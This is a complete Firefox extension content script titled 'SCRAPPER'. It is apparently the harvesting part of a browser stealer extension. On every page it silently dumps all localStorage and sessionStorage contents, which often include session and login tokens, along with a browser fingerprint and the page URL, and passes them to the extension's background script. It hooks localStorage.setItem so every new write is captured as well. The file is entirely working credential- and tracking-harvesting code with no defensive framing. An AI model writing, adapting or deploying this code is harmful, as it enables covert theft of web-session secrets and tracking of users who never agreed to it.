// SCRAPPER by BertUI - Firefox Content Script
// Captures: localStorage, sessionStorage, browser fingerprint

(function () {
  'use strict';

  function getLocalStorage() {
    const data = {};
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        data[key] = localStorage.getItem(key);
      }
    } catch (e) {}
    return data;
  }

  function getSessionStorage() {
    const data = {};
    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        data[key] = sessionStorage.getItem(key);
      }
    } catch (e) {}
    return data;
  }

  function getFingerprint() {
    return {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      languages: Array.from(navigator.languages || []),
      screenWidth: screen.width,
      screenHeight: screen.height,
      screenColorDepth: screen.colorDepth,
      devicePixelRatio: window.devicePixelRatio,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      doNotTrack: navigator.doNotTrack,
      cookiesEnabled: navigator.cookieEnabled,
      online: navigator.onLine,
      hardwareConcurrency: navigator.hardwareConcurrency,
      maxTouchPoints: navigator.maxTouchPoints,
      vendor: navigator.vendor
    };
  }

  function sendDump() {
    const ls = getLocalStorage();
    const ss = getSessionStorage();
    const fp = getFingerprint();

    if (Object.keys(ls).length > 0 || Object.keys(ss).length > 0) {
      browser.runtime.sendMessage({
        type: 'localStorage_dump',
        url: window.location.href,
        data: { localStorage: ls, sessionStorage: ss }
      }).catch(() => {});
    }

    browser.runtime.sendMessage({
      type: 'fingerprint',
      url: window.location.href,
      data: fp
    }).catch(() => {});
  }

  // Listen for background requests
  browser.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.type === 'request_localStorage') {
      sendDump();
      sendResponse({ ok: true });
    }
  });

  // Auto-capture on DOM ready
  if (document.readyState === 'complete') {
    setTimeout(sendDump, 500);
  } else {
    window.addEventListener('load', () => setTimeout(sendDump, 500));
  }

  // Watch for localStorage changes
  const _setItem = localStorage.setItem.bind(localStorage);
  localStorage.setItem = function (key, value) {
    _setItem(key, value);
    browser.runtime.sendMessage({
      type: 'localStorage_dump',
      url: window.location.href,
      data: { localStorage: getLocalStorage(), sessionStorage: getSessionStorage() }
    }).catch(() => {});
  };

})();